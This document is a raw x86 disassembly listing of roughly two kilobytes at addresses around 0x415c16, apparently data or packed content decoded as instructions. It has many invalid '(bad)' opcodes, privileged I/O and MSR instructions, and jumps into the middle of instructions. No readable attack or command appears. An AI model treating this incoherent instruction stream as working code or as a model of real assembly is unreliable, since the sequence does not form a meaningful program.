  415c16:	jo     0x415bc9
  415c18:	mov    esi,0xa219c3fc
  415c1d:	dec    edx
  415c1e:	daa    
  415c1f:	fisubr WORD PTR [ecx+ecx*2-0x7e44c79d]
  415c26:	inc    edx
  415c27:	mov    fs,WORD PTR [edx+eiz*1-0x23777fec]
  415c2e:	sar    BYTE PTR [ebx+0x6f],0x73
  415c32:	outs   dx,BYTE PTR ds:[esi]
  415c33:	cli    
  415c34:	fadd   DWORD PTR [ebp+ebx*1+0x7f6e847]
  415c3b:	and    edi,DWORD PTR [ecx+0x60]
  415c3e:	xchg   ecx,eax
  415c3f:	lahf   
  415c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c41:	jae    0x415bc7
  415c43:	leave  
  415c44:	lods   eax,DWORD PTR ds:[esi]
  415c45:	cs inc edx
  415c47:	wrmsr  
  415c49:	and    DWORD PTR [edi-0x556aafca],ebx
  415c4f:	xor    DWORD PTR [esi],ecx
  415c51:	pusha  
  415c52:	sbb    al,0xe2
  415c54:	pop    ss
  415c55:	xchg   ebp,eax
  415c56:	push   edi
  415c57:	xchg   esi,eax
  415c58:	shl    esi,1
  415c5a:	ins    BYTE PTR es:[edi],dx
  415c5b:	or     al,0x2f
  415c5d:	or     DWORD PTR ds:0x4b721649,edi
  415c63:	sbb    BYTE PTR [edi],bh
  415c65:	jge    0x415c66
  415c67:	jge    0x415ca3
  415c69:	xor    BYTE PTR [ecx+0x72d27f6e],dl
  415c6f:	not    DWORD PTR [eax-0x55a73020]
  415c75:	and    cl,BYTE PTR [edx+edi*1]
  415c78:	mov    ebp,0x5b85eb83
  415c7d:	(bad)  
  415c7e:	js     0x415ced
  415c80:	lods   al,BYTE PTR ds:[esi]
  415c81:	mov    cl,0x21
  415c83:	test   BYTE PTR ds:[ecx],ch
  415c86:	push   ss
  415c87:	ror    DWORD PTR [edi-0x23],1
  415c8a:	aas    
  415c8b:	lea    edi,fs:[eax+0x28]
  415c8f:	das    
  415c90:	jbe    0x415cc1
  415c92:	cdq    
  415c93:	mov    ch,0xc2
  415c95:	mov    dh,0xb5
  415c97:	jp     0x415c6e
  415c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c9a:	xchg   ecx,eax
  415c9b:	xchg   esp,eax
  415c9c:	jmp    0x415c8a
  415c9e:	addr16 mov edx,0x6b45594e
  415ca4:	inc    ecx
  415ca5:	and    eax,DWORD PTR [ecx+ecx*1]
  415ca8:	stos   DWORD PTR es:[edi],eax
  415ca9:	iret   
  415caa:	bnd jmp 0xacdf095f
  415cb0:	sub    al,0xa2
  415cb2:	or     eax,0x40da85d5
  415cb7:	out    dx,al
  415cb8:	sti    
  415cb9:	mov    BYTE PTR [ebx+0x13bb9b22],0x7
  415cc0:	push   cs
  415cc1:	jge    0x415cdc
  415cc3:	pop    edi
  415cc4:	or     bh,BYTE PTR [esi-0x33]
  415cc7:	mov    cl,0x43
  415cc9:	dec    ebx
  415cca:	sar    DWORD PTR [ebx+0x230788d3],0x49
  415cd1:	stc    
  415cd2:	and    eax,ebp
  415cd4:	js     0x415d0d
  415cd6:	dec    edx
  415cd7:	push   edx
  415cd8:	(bad)  
  415cd9:	in     al,dx
  415cda:	ja     0x415cb7
  415cdc:	xor    BYTE PTR [esi-0x73fd15b0],cl
  415ce2:	xor    BYTE PTR [ebp+0x66],0x5a
  415ce6:	(bad)  
  415ce7:	cmp    ah,dh
  415ce9:	sti    
  415cea:	inc    esp
  415ceb:	fcmovnb st,st(7)
  415ced:	loopne 0x415c78
  415cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cf0:	js     0x415d52
  415cf2:	mov    cl,0x45
  415cf4:	fnstenv [ecx+0x68]
  415cf7:	stc    
  415cf8:	retf   0x8c52
  415cfb:	fst    QWORD PTR [eax+eiz*4-0x4f]
  415cff:	inc    DWORD PTR [ebx+edx*1+0x2a]
  415d03:	inc    ebx
  415d04:	iret   
  415d05:	in     eax,dx
  415d06:	jecxz  0x415d0c
  415d08:	ret    
  415d09:	jnp    0x415cc8
  415d0b:	jo     0x415c99
  415d0d:	and    al,BYTE PTR [ebx+edx*1+0x6]
  415d11:	sub    al,0xcb
  415d13:	mov    ebx,DWORD PTR [esi]
  415d15:	xchg   ebp,eax
  415d16:	fcom   QWORD PTR [ebp-0x41]
  415d19:	sub    eax,0xfc53b148
  415d1e:	push   cs
  415d1f:	xor    cl,bh
  415d21:	in     eax,0xac
  415d23:	adc    dl,ah
  415d25:	rcl    esi,1
  415d27:	mov    DWORD PTR ds:0xc1c39119,ecx
  415d2d:	not    cl
  415d2f:	gs into 
  415d31:	aaa    
  415d32:	mov    bl,0xc0
  415d34:	inc    edi
  415d35:	jb     0x415d88
  415d37:	cmp    edi,esi
  415d39:	cmp    esi,DWORD PTR [eax+0x57]
  415d3c:	test   eax,0xd3293bb9
  415d41:	sub    BYTE PTR [eax-0x7],dl
  415d44:	retf   0x4c94
  415d47:	loopne 0x415da1
  415d49:	lods   al,BYTE PTR ds:[esi]
  415d4a:	push   eax
  415d4b:	sub    al,0xe4
  415d4d:	(bad)  
  415d4f:	mov    ds:0x88b239e3,eax
  415d54:	loop   0x415cf0
  415d56:	ins    DWORD PTR es:[edi],dx
  415d57:	dec    esp
  415d58:	inc    edi
  415d59:	xchg   edi,eax
  415d5a:	adc    bh,BYTE PTR [ebx]
  415d5c:	mov    bh,0x3b
  415d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d5f:	cmp    al,0x7
  415d61:	add    bh,BYTE PTR [ecx+0x26]
  415d64:	sar    DWORD PTR [eax-0xf],cl
  415d67:	int3   
  415d68:	sub    bl,BYTE PTR [edx+0x3]
  415d6b:	sahf   
  415d6c:	mov    eax,0x943c2cc7
  415d71:	and    al,0xc4
  415d73:	aas    
  415d74:	aad    0x65
  415d76:	mov    bh,0xe9
  415d78:	dec    ebp
  415d79:	arpl   WORD PTR [ebp+0x7ea78d85],cx
  415d7f:	fwait
  415d80:	add    ebx,0x1a0e483c
  415d86:	addr16 mov ss,esi
  415d89:	ror    DWORD PTR [edx+edi*2-0x42],cl
  415d8d:	imul   eax,DWORD PTR [ebx],0x93c8c325
  415d93:	cmc    
  415d94:	test   al,0x5b
  415d96:	aaa    
  415d97:	push   0xcf95184
  415d9c:	mov    bl,0x3e
  415d9e:	sar    BYTE PTR [eax-0x4384b0b9],0xc9
  415da5:	jl     0x415dcc
  415da7:	ss xchg edi,eax
  415da9:	pop    edi
  415daa:	pushf  
  415dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dac:	inc    esp
  415dad:	ret    
  415dae:	je     0x415dd2
  415db0:	hlt    
  415db1:	out    0x12,al
  415db3:	loopne 0x415e26
  415db5:	sub    BYTE PTR ds:0xfc5b8ed9,al
  415dbb:	repz mov ch,0xd8
  415dbe:	stos   DWORD PTR es:[edi],eax
  415dbf:	push   esp
  415dc0:	(bad)  
  415dc1:	sahf   
  415dc2:	cmp    DWORD PTR ds:0x94a04813,edx
  415dc8:	xlat   BYTE PTR ds:[ebx]
  415dc9:	test   DWORD PTR [ebx+0x3c],esp
  415dcc:	scas   eax,DWORD PTR es:[edi]
  415dcd:	sub    al,0xc2
  415dcf:	pop    esp
  415dd0:	jmp    0x8cae78be
  415dd5:	in     al,0x58
  415dd7:	mov    edi,0x57e2b5b4
  415ddc:	add    esi,esi
  415dde:	in     eax,0x71
  415de0:	clc    
  415de1:	cmp    DWORD PTR [ebp-0x41236448],0xa4bdfbec
  415deb:	shl    BYTE PTR [eax],0x4c
  415dee:	scas   al,BYTE PTR es:[edi]
  415def:	or     ch,BYTE PTR [edx]
  415df1:	jecxz  0x415e38
  415df3:	imul   ebp,DWORD PTR [esi+esi*2+0x2],0xa9956015
  415dfb:	and    al,0x9d
  415dfd:	int    0x56
  415dff:	jae    0x415e2e
  415e01:	cmp    bh,BYTE PTR [ebp+eax*8-0x3e]
  415e05:	add    ecx,esi
  415e07:	and    eax,0x83a1a851
  415e0c:	sbb    eax,0xe6a25457
  415e11:	xchg   BYTE PTR [esi],bl
  415e13:	pop    eax
  415e14:	lock mov esp,0x759a263
  415e1a:	iret   
  415e1b:	out    dx,eax
  415e1c:	push   es
  415e1d:	xchg   ebp,eax
  415e1e:	push   es
  415e1f:	pop    eax
  415e20:	lahf   
  415e21:	das    
  415e22:	aaa    
  415e23:	jb     0x415e32
  415e25:	sbb    eax,0x687c7900
  415e2a:	loop   0x415e51
  415e2c:	cld    
  415e2d:	into   
  415e2e:	jg     0x415e4b
  415e30:	in     al,0x2c
  415e32:	in     eax,0x6f
  415e34:	(bad)
  415e37:	jne    0x415db9
  415e39:	arpl   WORD PTR [ecx+0x4118cc6a],dx
  415e3f:	aad    0x4c
  415e41:	cmp    dh,BYTE PTR [esi-0x177fd6c5]
  415e47:	adc    ebx,0x582398b5
  415e4d:	sbb    dh,BYTE PTR [ebx+0x61342c9e]
  415e53:	ss xor cl,cl
  415e56:	cmp    al,0x87
  415e58:	push   ecx
  415e59:	cmp    ch,dh
  415e5b:	nop
  415e5c:	jb     0x415e0e
  415e5e:	mov    esp,0xa253b261
  415e63:	push   0x980f9f4f
  415e68:	lods   eax,DWORD PTR ds:[esi]
  415e69:	or     ecx,ecx
  415e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e6c:	push   esp
  415e6d:	leave  
  415e6e:	or     bh,BYTE PTR [ebp-0x5fd78bf1]
  415e74:	jnp    0x415e2a
  415e76:	(bad)  
  415e77:	pop    esi
  415e78:	pushf  
  415e79:	les    edi,FWORD PTR [esi-0x6bcfcf2e]
  415e7f:	inc    esp
  415e80:	cs mov ch,0x65
  415e83:	popf   
  415e84:	and    ah,BYTE PTR [ecx+0x54]
  415e87:	hlt    
  415e88:	mov    ebp,0x559af2c
  415e8d:	jmp    0xb69dc70a
  415e92:	sub    eax,0xcbeaef18
  415e97:	adc    ch,dh
  415e99:	xchg   edx,eax
  415e9a:	add    al,0xdd
  415e9c:	pop    esp
  415e9d:	pusha  
  415e9e:	sbb    bl,BYTE PTR [ebx+0x55]
  415ea1:	xor    bh,BYTE PTR [edx+eiz*1]
  415ea4:	sbb    ch,BYTE PTR [eax]
  415ea6:	fs pushf 
  415ea8:	test   BYTE PTR [edi-0x35],bh
  415eab:	mov    ds:0x2565a94,al
  415eb0:	in     eax,dx
  415eb1:	rcr    BYTE PTR [esi-0x9],1
  415eb4:	cwde   
  415eb5:	or     DWORD PTR [ecx],ebx
  415eb7:	jp     0x415e41
  415eb9:	mov    edi,0x7510616e
  415ebe:	mov    dl,0x71
  415ec0:	cmp    al,0xee
  415ec2:	jge    0x415f05
  415ec4:	loope  0x415e92
  415ec6:	cwd    
  415ec8:	mov    eax,ds:0x68f7ab4c
  415ecd:	mov    eax,0x50e069f
  415ed2:	xlat   BYTE PTR ds:[ebx]
  415ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed4:	jbe    0x415f2e
  415ed6:	mov    eax,0x463bf8d
  415edb:	or     eax,DWORD PTR [esi-0x28]
  415ede:	mov    al,0xdb
  415ee0:	dec    edi
  415ee1:	xor    BYTE PTR [edx],bh
  415ee3:	xor    al,0x66
  415ee5:	test   eax,0x1d750244
  415eea:	push   esp
  415eeb:	xchg   edi,eax
  415eec:	lock inc sp
  415eef:	int    0x2c
  415ef1:	push   cs
  415ef2:	push   edx
  415ef3:	inc    esp
  415ef4:	pop    edi
  415ef5:	cmc    
  415ef6:	mov    ebp,0x1f36d541
  415efb:	jae    0x415f12
  415efd:	inc    ecx
  415efe:	inc    eax
  415eff:	ret    
  415f00:	cdq    
  415f01:	jp     0x415ecd
  415f03:	xlat   BYTE PTR ds:[ebx]
  415f04:	ret    0x5a21
  415f07:	retf   
  415f08:	dec    eax
  415f09:	cmp    BYTE PTR [edi-0x4534b512],bh
  415f0f:	adc    DWORD PTR [ecx+0x1cae8a9a],esp
  415f15:	outs   dx,DWORD PTR ds:[esi]
  415f16:	xchg   ebx,eax
  415f17:	je     0x415f3a
  415f19:	jmp    0xcf87:0xac2d8ff6
  415f20:	sub    DWORD PTR [ebp+0x4e],ebx
  415f23:	add    ch,BYTE PTR [edx+0x66287f72]
  415f29:	js     0x415f45
  415f2b:	lods   al,BYTE PTR ds:[esi]
  415f2c:	repz jle 0x415ee0
  415f2f:	push   eax
  415f30:	lods   eax,DWORD PTR ds:[esi]
  415f31:	sbb    bh,BYTE PTR [eax]
  415f33:	jg     0x415ed5
  415f35:	leave  
  415f36:	mov    dl,BYTE PTR [edi-0x2]
  415f39:	test   eax,0x744de9b9
  415f3e:	sub    ebp,edi
  415f40:	xchg   esi,eax
  415f41:	loopne 0x415f20
  415f43:	aas    
  415f44:	adc    ch,ch
  415f46:	and    eax,0xeb64853b
  415f4b:	jg     0x415f62
  415f4d:	push   edx
  415f4e:	xchg   ecx,eax
  415f4f:	push   ebp
  415f50:	jecxz  0x415f53
  415f52:	enter  0x120b,0xed
  415f56:	enter  0x8a93,0x6d
  415f5a:	fs into 
  415f5c:	aam    0x1f
  415f5e:	ins    DWORD PTR es:[edi],dx
  415f5f:	test   BYTE PTR [eax-0x4710b342],dh
  415f65:	cmp    eax,DWORD PTR [ebp-0xb234215]
  415f6b:	add    BYTE PTR [ebx+0x79],ch
  415f6e:	int    0x41
  415f70:	dec    eax
  415f71:	dec    edx
  415f72:	pop    es
  415f73:	sbb    BYTE PTR [edi-0x7c1a4142],dl
  415f79:	(bad)  
  415f7b:	jnp    0x415f67
  415f7d:	pushf  
  415f7e:	sbb    BYTE PTR [ebp+0x475c63a3],al
  415f84:	daa    
  415f85:	pusha  
  415f86:	dec    esi
  415f87:	pop    edi
  415f88:	inc    ecx
  415f89:	jmp    0x5f43:0xef707f69
  415f90:	nop
  415f91:	sub    BYTE PTR [esi],0xfb
  415f94:	loope  0x415f1d
  415f96:	aad    0x70
  415f98:	outs   dx,BYTE PTR ds:[esi]
  415f99:	sbb    eax,0x251f8734
  415f9e:	lds    ecx,FWORD PTR [edx+0xfb45a94]
  415fa4:	sbb    eax,0x8f9ea80c
  415fa9:	jnp    0x415fa2
  415fab:	mov    ?,WORD PTR [edx+0x29c2b62a]
  415fb1:	popa   
  415fb2:	xor    al,0x82
  415fb4:	or     esi,DWORD PTR [esp+ebx*4+0x36]
  415fb8:	pop    ebp
  415fb9:	dec    esi
  415fba:	enter  0xeb5,0x26
  415fbe:	pop    ds
  415fbf:	mov    edi,0xd1927adb
  415fc4:	cmp    DWORD PTR ds:0x3ea2b89a,0x57
  415fcb:	jbe    0x41601b
  415fcd:	xchg   ebp,eax
  415fce:	sub    DWORD PTR [eax+esi*4],esi
  415fd1:	clc    
  415fd2:	fstp   TBYTE PTR [ecx+0x32061f91]
  415fd8:	and    al,0x1a
  415fda:	out    0x67,al
  415fdc:	(bad)  
  415fdd:	sbb    eax,0x21f826a8
  415fe2:	sbb    edi,edx
  415fe4:	ret    
  415fe5:	jno    0x416023
  415fe7:	add    bh,dl
  415fe9:	sub    dh,dl
  415feb:	xchg   edx,eax
  415fec:	and    DWORD PTR [ecx+0x340afa0f],0xf99ff028
  415ff6:	int    0xb
  415ff8:	mov    cl,0x77
  415ffa:	jge    0x41605c
  415ffc:	int3   
  415ffd:	dec    eax
  415ffe:	push   esi
  415fff:	sar    ebx,1
  416001:	xchg   BYTE PTR [ecx+0x63],ah
  416004:	cmp    DWORD PTR [eax],0x66eb8ca6
  41600a:	xor    cl,0x78
  41600d:	xor    esp,0x3a
  416010:	mov    ds:0xd5700957,al
  416015:	clc    
  416016:	addr16 sbb eax,0xdaf58bd1
  41601c:	sub    BYTE PTR [edi+0x357f4fed],0xb
  416023:	mov    ch,0xcc
  416025:	push   cs
  416026:	and    eax,0x7598966b
  41602b:	and    al,0x8
  41602d:	rcr    BYTE PTR [eax+ecx*2+0x2],0x5
  416032:	mov    ds:0x7421aa34,al
  416037:	(bad)  
  416038:	pop    esp
  416039:	nop
  41603a:	push   ss
  41603b:	sub    esi,esi
  41603d:	push   ss
  41603e:	sbb    bh,BYTE PTR [ebx+0x44]
  416041:	and    ecx,DWORD PTR [edi+0x4]
  416044:	pop    esp
  416045:	add    bl,BYTE PTR [ebp+0x5e]
  416048:	inc    ebx
  416049:	shl    cl,1
  41604b:	pop    edi
  41604c:	sbb    al,0x13
  41604e:	test   BYTE PTR [edx-0x1eee819b],cl
  416054:	mov    al,BYTE PTR [eax+ecx*2-0x28]
  416058:	xchg   ebp,eax
  416059:	sti    
  41605a:	and    al,0x74
  41605c:	leave  
  41605d:	addr16 push ecx
  41605f:	in     eax,dx
  416060:	xchg   BYTE PTR [edx],ah
  416062:	in     al,0xe8
  416064:	xchg   edi,eax
  416065:	addr16 test eax,0xe7c00172
  41606b:	dec    esp
  41606c:	sbb    ah,BYTE PTR [eax]
  41606e:	pop    ebx
  41606f:	push   ecx
  416070:	jle    0x41603d
  416072:	push   ebp
  416073:	les    edx,FWORD PTR [eax]
  416075:	mov    ds:0x18f2ca54,eax
  41607a:	hlt    
  41607b:	mov    bh,0x97
  41607d:	stos   DWORD PTR es:[edi],eax
  41607e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41607f:	mov    dl,0x24
  416081:	dec    edx
  416082:	fnsave [eax+eiz*1+0x5ec64cb]
  416089:	jp     0x416035
  41608b:	fwait
  41608c:	mov    bl,0x64
  41608e:	push   edi
  41608f:	mov    bh,0x61
  416091:	cmp    al,0x41
  416093:	aam    0xad
  416095:	adc    DWORD PTR [edx],0xffffffb2
  416098:	mov    ebx,0xeabfd84
  41609d:	xor    al,0xc8
  41609f:	mov    ecx,0xf25120f3
  4160a4:	aas    
  4160a5:	pop    es
  4160a6:	add    eax,0x280f976f
  4160ab:	push   0x7cd0daa
  4160b0:	ficom  DWORD PTR [ecx+0x2320fea8]
  4160b6:	or     bl,dl
  4160b8:	jno    0x4160de
  4160ba:	out    dx,al
  4160bb:	cld    
  4160bc:	out    0x25,al
  4160be:	(bad)  
  4160bf:	cmc    
  4160c0:	or     esp,esp
  4160c2:	mov    ebp,0x83c0da05
  4160c7:	fidivr WORD PTR [edx]
  4160c9:	retf   
  4160ca:	sub    eax,0x8305ac18
  4160cf:	jl     0x4160f9
  4160d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d2:	out    0x8d,al
  4160d4:	bound  ebp,QWORD PTR [ebx]
  4160d6:	mov    fs,WORD PTR [eax+0x7]
  4160d9:	outs   dx,DWORD PTR ds:[esi]
  4160da:	push   esp
  4160db:	fwait
  4160dc:	cmp    DWORD PTR ds:0xf3c2125c,eax
  4160e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e3:	in     eax,dx
  4160e4:	mov    bh,0xcd
  4160e6:	test   eax,0x36de0a7
  4160eb:	mul    BYTE PTR [esi+0x1fb0d3e]
  4160f1:	clc    
  4160f2:	shl    ecx,0xb1
  4160f5:	xor    BYTE PTR [esi],bl
  4160f7:	inc    esp
  4160f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160f9:	inc    edi
  4160fa:	rol    BYTE PTR [ecx],cl
  4160fc:	ss cmc 
  4160fe:	fiadd  WORD PTR [eax-0x3]
  416101:	(bad)  [ecx-0x7]
  416104:	push   ebx
  416105:	inc    esp
  416106:	sub    eax,DWORD PTR [ebp-0x42]
  416109:	cmovge esp,ecx
  41610c:	push   ebx
  41610d:	xchg   esp,eax
  41610e:	aad    0x21
  416110:	(bad)  
  416111:	mov    cl,0xe0
  416113:	test   DWORD PTR [edi],0xe5de852e
  416119:	ins    BYTE PTR es:[edi],dx
  41611a:	push   edx
  41611b:	outs   dx,DWORD PTR ds:[esi]
  41611c:	clc    
  41611d:	hlt    
  41611e:	shr    BYTE PTR [ecx],cl
  416120:	cmp    ebx,DWORD PTR [ecx]
  416122:	stc    
  416123:	jno    0x4160c2
  416125:	or     eax,0xc7fa87b9
  41612a:	push   ds
  41612b:	mov    ch,0x31
  41612d:	xor    BYTE PTR [ebp-0x3f1d89a5],ch
  416133:	test   eax,0x567d59ca
  416138:	daa    
  416139:	and    DWORD PTR [ebp-0x62c35a66],eax
  41613f:	fnstenv [eax+0x78532e2a]
  416145:	jge    0x4160f5
  416147:	fmul   DWORD PTR [ebp-0x26]
  41614a:	sbb    edi,eax
  41614c:	mov    bh,0x9a
  41614e:	mov    dl,0x25
  416150:	out    dx,al
  416151:	in     eax,dx
  416152:	push   ds
  416153:	adc    dl,bl
  416155:	aad    0x8a
  416157:	clc    
  416158:	and    cl,BYTE PTR [ebp+0x6d]
  41615b:	or     BYTE PTR [edx+edi*1],dh
  41615e:	push   0x187e22dc
  416163:	js     0x41616f
  416165:	or     BYTE PTR [ecx],ch
  416167:	stc    
  416168:	in     eax,dx
  416169:	sahf   
  41616a:	repz imul edi,DWORD PTR [edx-0x52469e7],0xffffffb4
  416172:	aaa    
  416173:	loopne 0x41617a
  416175:	xchg   ebp,eax
  416176:	retf   
  416177:	aas    
  416178:	mov    ecx,0xa5e5c9c8
  41617d:	jmp    0x361e:0x38ed7a32
  416184:	or     ebp,DWORD PTR [eax]
  416186:	xchg   esi,eax
  416187:	nop
  416188:	jl     0x416164
  41618a:	imul   esi,DWORD PTR [eax+0x432c7c5e],0xd3c2b8e
  416194:	push   ecx
  416195:	add    dh,dl
  416197:	xor    DWORD PTR [esi],edi
  416199:	xor    DWORD PTR [edi-0x646cb07a],ebp
  41619f:	fadd   QWORD PTR [ebp-0x63]
  4161a2:	test   eax,0x40b3a186
  4161a7:	fsubr  DWORD PTR ds:0xfe990f83
  4161ad:	(bad)
  4161b0:	imul   esp,DWORD PTR [esi],0x5c
  4161b3:	push   edi
  4161b4:	icebp  
  4161b5:	and    esi,edx
  4161b7:	pusha  
  4161b8:	pop    eax
  4161b9:	and    DWORD PTR [edi+0x280cfeaf],edi
  4161bf:	inc    edx
  4161c0:	push   ecx
  4161c1:	repz xlat BYTE PTR ds:[ebx]
  4161c3:	jecxz  0x416158
  4161c5:	cmp    ah,BYTE PTR ds:0x2d6b2a42
  4161cb:	xchg   edi,eax
  4161cc:	xor    ebx,DWORD PTR [esi-0x56]
  4161cf:	or     eax,0xae31587f
  4161d4:	mov    ds:0x49a7673,eax
  4161d9:	jbe    0x4161e6
  4161db:	sysenter 
  4161dd:	sbb    eax,0xffef44dd
  4161e2:	push   ds
  4161e3:	adc    BYTE PTR [esp+edx*1],bh
  4161e6:	fsub   QWORD PTR [eax+0x5f85d76e]
  4161ec:	pop    ebp
  4161ed:	mov    ds:0x6b97a9aa,al
  4161f2:	ja     0x416233
  4161f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161f5:	pop    esp
  4161f6:	mov    WORD PTR [ebx-0x55],?
  4161f9:	sbb    al,0x12
  4161fb:	pop    ebx
  4161fc:	xor    BYTE PTR [edx-0x1f],cl
  4161ff:	mov    ebx,0x1450cda5
  416204:	add    al,0x1c
  416206:	dec    ecx
  416207:	icebp  
  416208:	xchg   esi,eax
  416209:	cmp    al,0x9c
  41620b:	test   DWORD PTR [ebp+eiz*4-0xbd03f57],eax
  416212:	pusha  
  416213:	add    eax,0xebd1fb8d
  416218:	add    dl,BYTE PTR [edi+0x114230e]
  41621e:	mov    DWORD PTR [ebx],esp
  416220:	ins    DWORD PTR es:[edi],dx
  416221:	pop    esp
  416222:	cmp    al,0xe7
  416224:	xchg   esi,eax
  416225:	cdq    
  416226:	enter  0x5e08,0x4c
  41622a:	pop    esp
  41622b:	dec    ebx
  41622c:	es mov ecx,0xd8e53a88
  416232:	ss jbe 0x41622a
  416235:	xor    esi,DWORD PTR [edx+0x64]
  416238:	and    al,0x2b
  41623a:	and    eax,0x4b37c095
  41623f:	jno    0x416234
  416241:	add    ah,BYTE PTR [esi]
  416243:	stos   DWORD PTR es:[edi],eax
  416244:	aas    
  416245:	adc    eax,0x41605342
  41624a:	cmp    al,0x50
  41624c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41624d:	mov    esi,es
  41624f:	ret    0xed12
  416252:	xchg   edx,eax
  416253:	out    0xbd,eax
  416255:	ss push cs
  416257:	xlat   BYTE PTR ds:[ebx]
  416258:	sbb    al,0xb4
  41625a:	cld    
  41625b:	std    
  41625c:	pusha  
  41625d:	pop    ebx
  41625e:	push   esi
  41625f:	sub    dh,BYTE PTR [edx]
  416261:	enter  0x1cfb,0xaa
  416265:	sbb    ah,BYTE PTR [ebx+0x5ed8bb34]
  41626b:	xchg   ebx,eax
  41626c:	jle    0x416241
  41626e:	mov    ah,0x3a
  416270:	mov    ds:0x5b8bbf45,al
  416275:	scas   eax,DWORD PTR es:[edi]
  416276:	jge    0x4162cb
  416278:	pop    ebx
  416279:	push   0x8e59dad5
  41627e:	inc    esi
  41627f:	data16 scas al,BYTE PTR es:[edi]
  416281:	sub    eax,0x3dd60adc
  416286:	dec    ecx
  416287:	xchg   BYTE PTR [eax-0x7b0669a8],bh
  41628d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41628e:	jns    0x4162b1
  416290:	adc    ebx,DWORD PTR [ebp+0x1d]
  416293:	add    esi,DWORD PTR [edx]
  416295:	mov    dl,0x9e
  416297:	inc    ebx
  416298:	mov    ecx,0x1ab1fddb
  41629d:	arpl   WORD PTR [esi+0x4d534513],bp
  4162a3:	pop    ss
  4162a4:	mov    ds:0xce2850bd,eax
  4162a9:	add    al,0x6b
  4162ab:	mov    fs,WORD PTR [ebx]
  4162ad:	(bad)  
  4162ae:	fld    DWORD PTR [ecx-0x2f]
  4162b1:	iret   
  4162b2:	xchg   esp,eax
  4162b3:	mov    eax,ds:0xdfc53482
  4162b8:	repnz das 
  4162ba:	call   0x1f68:0x8a07d5fd
  4162c1:	icebp  
  4162c2:	scas   al,BYTE PTR es:[edi]
  4162c3:	shr    dh,cl
  4162c5:	mov    DWORD PTR [esi-0x6e],esi
  4162c8:	in     al,dx
  4162c9:	push   ebx
  4162ca:	jno    0x4162fa
  4162cc:	or     ch,BYTE PTR [ecx]
  4162ce:	and    BYTE PTR [ebx],al
  4162d0:	ja     0x4162fa
  4162d2:	es (bad) 
  4162d4:	stc    
  4162d5:	cmp    al,0x62
  4162d7:	and    bl,BYTE PTR [ebx+ecx*1+0x52]
  4162db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162dc:	int3   
  4162dd:	gs and al,0xf1
  4162e0:	jo     0x4162d3
  4162e2:	dec    esi
  4162e3:	imul   esp,DWORD PTR [ecx-0x72],0x93cc872b
  4162ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162eb:	jno    0x416365
  4162ed:	sbb    DWORD PTR [esi+0x54a406cf],0xffffffff
  4162f4:	outs   dx,DWORD PTR ds:[esi]
  4162f5:	mov    ebp,0x180d5c36
  4162fa:	push   cs
  4162fb:	sbb    eax,0x36b5e1c7
  416300:	mov    bl,BYTE PTR [esi+0x6a246275]
  416306:	push   esp
  416307:	popf   
  416308:	pop    ebx
  416309:	shl    DWORD PTR [edx+0x44],0x3
  41630d:	in     eax,dx
  41630e:	add    eax,0xf3bf353
  416313:	mov    cl,0x42
  416315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416316:	jmp    0x978cb1c6
  41631b:	std    
  41631c:	add    BYTE PTR [edx+0x4d],0xeb
  416320:	or     al,0x1
  416322:	jl     0x4162e1
  416324:	jbe    0x41637f
  416326:	xor    al,0x2f
  416328:	out    dx,eax
  416329:	test   al,0x34
  41632b:	js     0x41637f
  41632d:	pusha  
  41632e:	jnp    0x416372
  416330:	mov    ebp,0x18abe736
  416335:	pop    esi
  416336:	in     al,dx
  416337:	and    al,0x2e
  416339:	in     al,dx
  41633a:	push   ecx
  41633b:	dec    edx
  41633c:	sub    ebp,ebx
  41633e:	pop    ebx
  41633f:	sbb    ah,ah
  416341:	or     bl,dl
  416343:	std    
  416344:	and    bl,BYTE PTR [edx+ebp*8-0x734ef146]
  41634b:	cwde   
  41634c:	and    al,0x15
  41634f:	mov    eax,ds:0x4be0203b
  416354:	dec    edi
  416355:	repz idiv DWORD PTR [edi+0x476af8eb]
  41635c:	jecxz  0x41637b
  41635e:	pop    ebp
  41635f:	sahf   
  416360:	push   cs
  416361:	push   ebp
  416362:	dec    ebx
  416363:	pop    edi
  416364:	mov    edx,0x734d94ff
  416369:	xlat   BYTE PTR ds:[ebx]
  41636a:	mov    edx,0x7a09480c
  41636f:	xor    eax,0x3e0590b1
  416374:	aaa    
  416375:	jg     0x4163cf
  416377:	add    ebx,DWORD PTR [ebp-0xe]
  41637a:	sub    al,bh
  41637c:	popa   
  41637d:	mov    ebx,DWORD PTR [edi]
  41637f:	mov    ch,0x8f
  416381:	pop    ds
  416382:	sbb    DWORD PTR [ebx],esp
  416384:	out    0x6a,al
  416386:	or     ch,BYTE PTR [edx-0xb88aed4]
  41638c:	dec    esi
  41638d:	mov    ?,WORD PTR [ebx-0x23]
  416390:	test   al,0x9d
  416392:	jne    0x416383
  416394:	outs   dx,DWORD PTR ds:[esi]
  416395:	push   edx
  416396:	dec    esp
  416397:	js     0x416401
  416399:	lods   al,BYTE PTR ds:[esi]
  41639a:	jg     0x4163d4
  41639c:	jl     0x416359
  41639e:	ins    DWORD PTR es:[edi],dx
  41639f:	fstp   TBYTE PTR [ecx+0x28]
  4163a2:	pop    edx
  4163a3:	scas   al,BYTE PTR es:[di]
  4163a5:	or     DWORD PTR [ebx+0x7c17c57b],edi
  4163ab:	xchg   edi,eax
  4163ac:	pop    esi
  4163ad:	push   ebx
  4163ae:	gs test al,0x2a
  4163b1:	rcl    DWORD PTR [edi+ecx*4+0x5e],1
